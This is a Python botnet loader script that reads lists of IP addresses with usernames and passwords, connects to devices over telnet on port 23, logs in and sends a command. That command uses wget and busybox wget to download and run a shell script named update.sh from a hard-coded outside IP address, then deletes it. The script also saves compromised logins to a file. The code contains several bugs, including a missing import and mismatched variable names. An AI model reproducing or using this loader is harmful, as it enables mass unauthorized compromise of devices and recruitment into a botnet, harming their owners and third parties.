#!/usr/bin/python
#Phaaaat hax SSH loader by Milenko

import sys, re, os, paramiko, socket
from threading import Thread
from time import sleep

if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")

paramiko.util.log_to_file("/dev/null")
rekdevice="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.82.70.225/update.sh; busybox wget http://80.82.70.225/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh" #command to send
print "\033[31m"

print "S-S-SUUUPER fast telnet loader by Milenko"
print
#simply find and replace newlines to :: then a newline so every IP starts with ::. It will scan those for port 22 or whatever your skiddie heart desires </3
print "Reads ip:user:pass and simply checks the IP for port 23."
print "Then writes loads the bonet onto it and saves the logins with SSH running to \"telnetopen.txt\""
print "It is VERY fast and extremely efficient."
print "As it splits the file into equal chunks for each thread!"

threads = int(raw_input("Threads: "))

lines = open(sys.argv[1],"r").readlines()

fh = open("telnetopen.txt","a+")

def chunkify(lst,n):
    return [ lst[i::n] for i in xrange(n) ]

running = 0

loaded = 0

def printStatus():
    while 1:
        sleep(10)
        print "\033[32m[\033[31m+\033[32m] Total eye pees loaded: " + str(loaded) + "\033[37m"
        if loaded >= 1000:
            print "Dayum u got sum phat hax brah :^}"

def haxit(ip, username, password):
	tn = telnetlib.Telnet(self.ip)

	try:
		tn.read_until(b"sername: ")
		tn.write(username + "\n")

		tn.read_until(b"assword: ")
		tn.write(password + "\n")
		prompt = tn.read_all()
		if "$" in prompt or "#" in prompt:
			tn.write(tekdevice + "\n")
			print "\033[32m[\033[31m+\033[32m] Command Sent: " + ip + "\033[37m"
	except:
		pass

def check(chunk, fh):
    global running
    running += 1
    threadID = running
    for login in chunk:
        if login.startswith("DUP"):
            continue # skip DUPS cause fuck em

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.37)
        try:
            s.connect((login.split(":")[2], 23))
            s.close()
            print "\033[32m[\033[31m+\033[32m] " + login + " has telnet open. Loading..."
            haxit(login.split(":")[0], login.split(":")[1], login.split(":")[2])
            fh.write(login + "\r\n")
            fh.flush()
        except:
            pass
    print "\033[32m[\033[31m+\033[32m] Thread " + str(threadID) + " has finished scanning " + str(len(chunk)) + " IPs. Loaded: " + str(loads)
    running -= 1

lines = map(lambda s: s.strip(), lines) # remove all newlines

chunks = chunkify(lines, threads) # make seperate chunk for each thread

print "STARTING SCAN AND LOAD!!!"

Thread(target = printStatus, args = ()).start()

for thread in xrange(0,threads):
    if thread >= 384:
        time.sleep(0.2)
    try:
        Thread(target = check, args = (chunks[thread], fh,)).start()
    except:
        pass
print "Scanning... Press enter 3 times to stop."

for i in range(0,3):
    raw_input()

fh.close()

os.popen("kill -9 " + str(os.getpid()))